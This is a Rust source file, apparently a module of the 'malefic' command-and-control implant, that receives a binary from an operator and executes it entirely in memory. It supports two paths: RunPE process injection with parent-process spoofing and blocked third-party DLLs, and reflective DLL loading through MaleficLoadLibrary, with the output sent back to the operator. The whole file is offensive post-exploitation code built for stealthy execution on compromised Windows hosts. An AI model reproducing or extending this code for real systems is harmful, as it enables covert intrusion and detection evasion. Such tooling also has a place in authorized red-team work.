use malefic_helper::protobuf::implantpb::AssemblyResponse;
use crate::{check_request, to_error, Module, Result, TaskResult};
use malefic_helper::protobuf::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_trait::module_impl;
use std::ffi::CString;
use std::ptr::null;

pub struct ExecutePE {}

#[async_trait]
#[module_impl("execute_pe")]
impl Module for ExecutePE {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let name = request.name;
        let bin = request.bin;
        let sacrifice = request.sacrifice;
        let need_output = request.output;
        let mut ret: Vec<u8> = Vec::new();
        let mut response = AssemblyResponse::default();

        if let Some(sacrifice) = sacrifice {
            println!("{:#?}", sacrifice);
            let mut par = String::new();
            for param in sacrifice.params {
                par.push_str(&param);
                par.push(' ');
            }
            par.push('\x00');

            let ppid = sacrifice.ppid;
            let is_block_dll = sacrifice.block_dll;

            #[cfg(feature = "community")]
            {
                let result = unsafe {
                    crate::RunPE(
                        par.as_ptr() as _,
                        bin.as_ptr() as _,
                        bin.len(),
                        false,
                        ppid,
                        is_block_dll,
                        need_output,
                    )
                };
                if result.is_null() {
                    to_error!(Err("Bof Loader failed!".to_string()))?
                }
                let ret_s = unsafe {CString::from_raw(result as _).to_string_lossy().to_string()};
                ret = ret_s.into_bytes();
            }

            #[cfg(feature = "professional")]
            {
                ret = unsafe {
                    to_error!(malefic_win_kit::dynamic::RunPE::RunPE(
                        par.as_ptr() as _,
                        bin.as_ptr() as _,
                        bin.len(),
                        false,
                        ppid,
                        is_block_dll,
                        need_output,
                    ))?
                }
            }
        } else {
            let new_name = format!("{}\x00", name);
            #[cfg(feature = "community")]
            {
                unsafe {
                    let dark_module = crate::MaleficLoadLibrary(
                        crate::AUTO_RUN_DLL_MAIN | crate::LOAD_MEMORY as u32,
                        std::ptr::null(),
                        bin.as_ptr() as _,
                        bin.len(),
                        name.as_ptr() as _,
                    );
                    // MaleficLoadLibrary::UnLoadLibrary(dark_module as _);
                }
            }
            #[cfg(feature = "professional")]
            {
                let dark_module = unsafe {
                    malefic_win_kit::dynamic::MaleficLoadLibrary::MaleficLoadLibrary(
                        malefic_win_kit::dynamic::MaleficLoadLibrary::AUTO_RUN_DLL_MAIN | 
                        malefic_win_kit::dynamic::MaleficLoadLibrary::LOAD_MEMORY as u32,
                        null(),
                        bin.as_ptr() as _,
                        bin.len(),
                        new_name.as_ptr() as _,
                    )
                };
                unsafe {malefic_win_kit::dynamic::MaleficLoadLibrary::UnLoadLibrary(dark_module as _)};
            }
 
        }


        response.status = 0;
        response.data = ret;
        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(response)))
    }
}